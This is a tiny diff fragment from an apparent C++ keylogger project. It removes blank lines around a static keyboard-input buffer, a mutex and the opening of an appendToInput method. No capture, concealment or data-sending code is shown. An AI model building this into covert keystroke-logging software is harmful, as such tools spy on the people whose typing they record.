@@ -2,10 +2,8 @@
 
 namespace keylogger
 {
-
 std::string KeyboardInput::keyboardInput = {};
 std::mutex KeyboardInput::lock = {};
-
 
 void KeyboardInput::appendToInput(const std::string& data)
 {
